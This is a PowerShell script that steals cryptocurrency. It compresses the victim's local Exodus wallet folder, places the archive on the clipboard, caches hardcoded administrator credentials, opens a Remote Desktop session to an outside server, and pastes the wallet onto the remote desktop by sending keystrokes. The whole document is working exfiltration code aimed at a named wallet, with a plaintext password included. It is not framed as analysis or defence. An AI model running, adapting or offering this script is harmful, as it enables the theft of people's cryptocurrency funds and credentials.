# === CONFIGURATION ===
$server   = "rdp.rewebly.com"
$username = "corp\Administrator"
$password = "!Mamoute901901a"
$tempRDP  = "$env:TEMP\fullsession.rdp"

# Title of the RDP window (for AppActivate)
$rdpWindowTitle = "fullsession - rdp.rewebly.com - Remote Desktop Connection"

# Local Exodus folder
$exodusPath = "$env:APPDATA\Exodus"
$exodusZip  = "$env:TEMP\exodus_wallet_backup.zip"

# === 1. Create a FULL DESKTOP RDP config ===
$rdpContent = @"
full address:s:$server
username:s:$username
screen mode id:i:2
desktopwidth:i:1280
desktopheight:i:800
session bpp:i:32
redirectclipboard:i:1
redirectprinters:i:1
redirectcomports:i:1
redirectsmartcards:i:1
devicestoredirect:s:*
redirectdrives:i:0
promptcredentialonce:i:0
authentication level:i:0
"@
Set-Content -Path $tempRDP -Value $rdpContent -Encoding ASCII

# === 2. Zip the Exodus wallet folder ===
if (Test-Path $exodusPath) {
    Write-Host "[*] Compressing Exodus wallet folder..."
    if (Test-Path $exodusZip) { Remove-Item $exodusZip -Force }
    Compress-Archive -Path $exodusPath -DestinationPath $exodusZip -Force
    Write-Host "[+] Exodus wallet zipped at $exodusZip"
} else {
    Write-Host "[-] No Exodus wallet found."
    exit
}

# === 3. Put the ZIP into clipboard ===
Add-Type -AssemblyName System.Windows.Forms
$files = New-Object System.Collections.Specialized.StringCollection
$files.Add($exodusZip)
[System.Windows.Forms.Clipboard]::SetFileDropList($files)
Write-Host "[+] Exodus wallet ZIP is now in clipboard."

# === 4. Cache credentials & launch FULL RDP session ===
cmdkey /generic:$server /user:$username /pass:$password | Out-Null
Write-Host "[*] Launching FULL RDP desktop session..."
Start-Process "mstsc.exe" -ArgumentList $tempRDP

# === 5. Wait for RDP to open ===
Start-Sleep -Seconds 30  # give enough time for desktop to load

# === 6. Send Ctrl+V + Enter to remote desktop ===
$shell = New-Object -ComObject wscript.shell
$activated = $shell.AppActivate($rdpWindowTitle)
Start-Sleep -Seconds 1

if ($activated) {
    Write-Host "[*] Sending Ctrl+V to remote desktop..."
    $shell.SendKeys("^v")     # Paste the ZIP
    Start-Sleep -Seconds 2
    $shell.SendKeys("{ENTER}")  # Press Enter if needed
    Write-Host "[+] Paste command sent! File should appear on remote desktop."
} else {
    Write-Host "[-] Could not find RDP window titled '$rdpWindowTitle'. Adjust the title if needed."
}
